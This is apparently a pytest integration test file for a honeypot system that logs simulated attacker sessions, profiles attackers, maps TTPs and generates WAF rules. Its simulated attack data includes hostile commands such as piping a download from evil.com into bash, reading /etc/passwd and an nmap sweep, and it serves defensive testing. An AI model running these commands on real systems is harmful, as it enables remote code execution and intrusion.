"""
test_integration.py -- End-to-end integration tests.

Full flow: spawn honeypot -> simulate attack -> check logs -> check profile -> check API
"""

from __future__ import annotations

import pytest
from collections import defaultdict
from uuid import UUID, uuid4

from httpx import AsyncClient
from ember_honeypot.api.main import app
from ember_honeypot.core.orchestrator import HoneypotOrchestrator
from ember_honeypot.core.logger import InteractionLogger
from ember_honeypot.core.profiler import AttackerProfiler
from ember_honeypot.core.emulator import ServiceEmulator, SSHConfig
from ember_honeypot.intel.ttp_extractor import TTPExtractor
from ember_honeypot.intel.ioc_generator import IOCGenerator
from ember_honeypot.intel.threat_scorer import ThreatScorer
from ember_honeypot.swarm.centuria_adapter import CenturiaAdapter, ThreatIntel
from ember_honeypot.swarm.threat_feed import ThreatFeed, ThreatUpdate, ThreatSeverity, ThreatCategory
from ember_honeypot.swarm.adaptive_defense import AdaptiveDefense, ThreatScore
from ember_honeypot.integration.ember_adapter import EmberArmorAdapter
from ember_honeypot.models import (
    DecoyPersona,
    HoneypotType,
    InteractionLog,
    InteractionType,
    InstanceStatus,
    TTPRecord as ModelTTPRecord,
)


@pytest.mark.asyncio
class TestEndToEndFlow:
    """End-to-end integration flow tests."""

    async def test_full_attack_simulation(self) -> None:
        """Test complete attack simulation pipeline."""
        # 1. Initialize all components
        orch = HoneypotOrchestrator()
        logger = InteractionLogger()
        profiler = AttackerProfiler()
        extractor = TTPExtractor()
        ioc_gen = IOCGenerator()
        scorer = ThreatScorer()
        centuria = CenturiaAdapter(endpoint="http://mock:9000")
        threat_feed = ThreatFeed()
        defense = AdaptiveDefense()
        ember = EmberArmorAdapter(
            auth_url="http://mock:8080/auth",
            api_key="test-key",
        )

        # 2. Authenticate with Ember
        token = await ember.authenticate()
        assert token is not None

        # 3. Connect to swarm
        connected = await centuria.connect()
        assert connected is True

        # 4. Create honeypot
        persona = DecoyPersona(
            role="developer",
            name="Alex Dev",
            username="adev",
            typical_commands=["ls", "git status", "python manage.py"],
        )
        instance = await orch.create_instance(
            service_type=HoneypotType.SSH,
            persona=persona,
            network_zone="dmz-01",
            duration_minutes=60,
        )
        assert instance.status == InstanceStatus.ACTIVE

        # 5. Simulate attack interactions
        session_id = uuid4()
        attacker_id = uuid4()
        source_ip = "192.168.1.100"

        attack_commands = [
            ("admin:password123", "Access denied"),
            ("ls -la", "drwxr-xr-x 5 user user"),
            ("whoami", "developer"),
            ("cat /etc/passwd", "root:x:0:0:root:/root:/bin/bash"),
            ("curl http://evil.com/payload | bash", "Downloading..."),
            ("nmap -sS 10.0.0.0/24", "Starting Nmap scan..."),
        ]

        for cmd, output in attack_commands:
            await logger.log_command(
                session_id=session_id,
                attacker_id=attacker_id,
                honeypot_id=instance.id,
                command=cmd,
                output=output,
                metadata={"source_ip": source_ip},
            )

        # 6. Retrieve session timeline
        timeline = await logger.get_session_timeline(session_id)
        assert len(timeline) == len(attack_commands)
        assert timeline[0].sequence_number == 1
        assert timeline[-1].sequence_number == len(attack_commands)

        # 7. Profile the attacker
        interactions = await logger.get_session_timeline(session_id)
        profile = await profiler.fingerprint(source_ip, interactions)
        assert profile is not None
        assert source_ip in profile.source_ips
        assert profile.total_commands == len(attack_commands)
        assert profile.threat_score > 0

        # 8. Extract TTPs
        ttps = extractor.extract_ttp(interactions)
        assert isinstance(ttps, list)

        # 9. Generate IOCs
        iocs = ioc_gen.generate_iocs(interactions)
        assert iocs is not None

        # 10. Score threat
        threat_score = scorer.score_threat(profile, ttps)
        assert threat_score is not None
        assert 0.0 <= threat_score.overall <= 1.0

        # 11. Submit to swarm (convert TTPRecord types)
        model_ttps = [
            ModelTTPRecord(**t.model_dump()) for t in ttps
        ]
        intel = ThreatIntel(
            attacker_ip=source_ip,
            ttps=model_ttps,
            threat_score=int(threat_score.overall * 100),
            session_id=session_id,
        )
        swarm_result = await centuria.submit_threat_intel(intel)
        assert swarm_result is True

        # 12. Publish to threat feed
        async def feed_subscriber(update: ThreatUpdate) -> None:
            pass

        threat_feed.subscribe(feed_subscriber)
        await threat_feed.publish(ThreatUpdate(
            severity=ThreatSeverity.HIGH if threat_score.overall > 0.6 else ThreatSeverity.MEDIUM,
            category=ThreatCategory.INTRUSION,
            source_ip=source_ip,
            description=f"Attack from {source_ip} scored {int(threat_score.overall * 100)}",
            session_id=session_id,
        ))
        assert threat_feed.get_stats()["total_published"] == 1

        # 13. Update adaptive defense
        actions = defense.update_posture(ThreatScore(
            overall=threat_score.overall,
            sophistication=threat_score.sophistication,
            persistence=threat_score.persistence,
        ))
        assert isinstance(actions, list)

        # 14. Auto-segment attacker
        if threat_score.overall > 0.4:
            segmented = defense.auto_segment(source_ip)
            assert segmented is True
            assert defense.is_segmented(source_ip)

        # 15. Deploy countermeasures
        if ttps:
            cm_actions = defense.deploy_countermeasures(ttps)
            assert isinstance(cm_actions, list)

        # 16. Generate WAF rules from payloads
        payloads = [i.raw_input for i in interactions]
        waf_rules = defense.generate_waf_rules(payloads)
        assert isinstance(waf_rules, list)

        # 17. Audit log
        audit_result = await ember.log_audit_event(
            "attack_detected",
            {"session_id": str(session_id), "attacker_ip": source_ip, "score": threat_score.overall},
        )
        assert audit_result is True

        # 18. Clean up
        await orch.destroy_instance(instance.id)
        instances = await orch.list_instances()
        assert len(instances) == 0

        await centuria.disconnect()

    async def test_api_health_integration(self, async_client: AsyncClient) -> None:
        """Test API health endpoint as part of integration."""
        response = await async_client.get("/api/v1/health")
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "healthy"
        assert "swarm_connected" in data
        assert "integration_authenticated" in data

    async def test_honeypot_lifecycle_api(self, async_client: AsyncClient) -> None:
        """Test honeypot lifecycle through API."""
        # Create
        payload = {
            "service_type": "SSH",
            "persona": {"role": "admin", "name": "Admin", "username": "admin"},
            "network_zone": "test-zone",
        }
        create_resp = await async_client.post("/api/v1/honeypots", json=payload)
        assert create_resp.status_code == 200
        hp_id = create_resp.json()["id"]

        # List
        list_resp = await async_client.get("/api/v1/honeypots")
        assert list_resp.status_code == 200
        hps = list_resp.json()
        assert any(h["id"] == hp_id for h in hps)

        # Get detail
        detail_resp = await async_client.get(f"/api/v1/honeypots/{hp_id}")
        assert detail_resp.status_code == 200
        assert detail_resp.json()["id"] == hp_id

        # Destroy
        del_resp = await async_client.delete(f"/api/v1/honeypots/{hp_id}")
        assert del_resp.status_code == 200

    async def test_swarm_intel_flow(self, mock_centuria: CenturiaAdapter, threat_feed: ThreatFeed) -> None:
        """Test swarm intelligence sharing flow."""
        # Submit intel
        intel = ThreatIntel(
            attacker_ip="10.0.0.50",
            threat_score=75,
            confidence=0.8,
        )
        result = await mock_centuria.submit_threat_intel(intel)
        assert result is True

        # Verify in collective memory
        memory = await mock_centuria.get_collective_memory("10.0.0.50")
        assert memory is not None
        assert memory.aggregate_threat_score >= 75

        # Publish to threat feed
        received_updates: list[ThreatUpdate] = []

        async def collector(update: ThreatUpdate) -> None:
            received_updates.append(update)

        threat_feed.subscribe(collector)
        await threat_feed.publish(ThreatUpdate(
            severity=ThreatSeverity.HIGH,
            source_ip="10.0.0.50",
            description="Test threat from integration",
        ))
        assert len(received_updates) == 1
        assert received_updates[0].source_ip == "10.0.0.50"

    async def test_ember_audit_integration(self, mock_ember: EmberArmorAdapter) -> None:
        """Test Ember audit logging integration."""
        result = await mock_ember.log_audit_event(
            "honeypot_created",
            {"honeypot_id": str(uuid4()), "service_type": "SSH"},
        )
        assert result is True

        # Check safety check
        safety = await mock_ember.check_safety({
            "action_type": "auto_segment",
            "risk_level": "high",
        })
        assert safety.allowed is True
        assert safety.risk_score > 0

    async def test_defense_pipeline(self, adaptive_defense: AdaptiveDefense, attack_payloads: list[str]) -> None:
        """Test the full defense pipeline."""
        # Generate WAF rules
        rules = adaptive_defense.generate_waf_rules(attack_payloads)
        assert len(rules) > 0
        for rule in rules:
            assert "SecRule" in rule

        # Auto-segment
        adaptive_defense.auto_segment("10.0.0.99")
        assert adaptive_defense.is_segmented("10.0.0.99")

        # Deploy countermeasures for TTPs
        from ember_honeypot.models import TTPRecord
        ttps = [
            TTPRecord(
                tactic="Discovery",
                tactic_id="TA0007",
                technique="Network Service Discovery",
                technique_id="T1046",
                procedure="nmap scan",
                confidence=0.8,
            ),
            TTPRecord(
                tactic="Execution",
                tactic_id="TA0002",
                technique="Command and Scripting Interpreter",
                technique_id="T1059",
                procedure="bash execution",
                confidence=0.7,
            ),
        ]
        actions = adaptive_defense.deploy_countermeasures(ttps)
        assert isinstance(actions, list)

        # Check stats
        stats = adaptive_defense.get_stats()
        assert stats["total_actions"] > 0
        assert stats["segmented_ips"] == 1

    async def test_threat_scoring_to_defense(self, sample_interactions: list[InteractionLog]) -> None:
        """Test full pipeline from interactions to defense actions."""
        # Extract TTPs
        from ember_honeypot.intel.ttp_extractor import TTPExtractor
        from ember_honeypot.intel.threat_scorer import ThreatScorer
        from ember_honeypot.core.profiler import AttackerProfiler
        from ember_honeypot.swarm.adaptive_defense import AdaptiveDefense, ThreatScore

        extractor = TTPExtractor()
        scorer = ThreatScorer()
        profiler = AttackerProfiler()
        defense = AdaptiveDefense()

        # Profile attacker
        profile = await profiler.fingerprint("10.0.0.50", sample_interactions)

        # Extract TTPs
        ttps = extractor.extract_ttp(sample_interactions)

        # Score
        threat = scorer.score_threat(profile, ttps)

        # Update defense (convert float 0-1 scores to int 0-100)
        actions = defense.update_posture(ThreatScore(
            overall=threat.overall,
            sophistication=threat.sophistication,
            persistence=threat.persistence,
        ))
        # Adaptive defense may return 0 actions for low scores; validate structure
        assert isinstance(actions, list)
        assert all(isinstance(a, str) for a in actions)

    async def test_multi_honeypot_orchestration(self) -> None:
        """Test orchestrating multiple honeypots simultaneously."""
        orch = HoneypotOrchestrator()
        persona = DecoyPersona(role="developer", name="Dev", username="dev")

        # Create multiple instances
        instances = []
        for svc_type in [HoneypotType.SSH, HoneypotType.HTTP, HoneypotType.FTP]:
            instance = await orch.create_instance(svc_type, persona)
            instances.append(instance)
            assert instance.status == InstanceStatus.ACTIVE

        # Verify all are active
        active = await orch.list_instances(InstanceStatus.ACTIVE)
        assert len(active) == 3

        # Destroy all
        for instance in instances:
            await orch.destroy_instance(instance.id)

        remaining = await orch.list_instances()
        assert len(remaining) == 0

    async def test_threat_feed_broadcast(self, threat_feed: ThreatFeed) -> None:
        """Test threat feed broadcasts correctly."""
        received: list[ThreatUpdate] = []

        async def handler(update: ThreatUpdate) -> None:
            received.append(update)

        threat_feed.subscribe(handler)

        # Publish multiple threats
        for i in range(10):
            await threat_feed.publish(ThreatUpdate(
                severity=ThreatSeverity.MEDIUM,
                source_ip=f"10.0.0.{i}",
                description=f"Threat {i}",
            ))

        assert len(received) == 10

        # Check history
        recent = threat_feed.get_recent(limit=5)
        assert len(recent) == 5
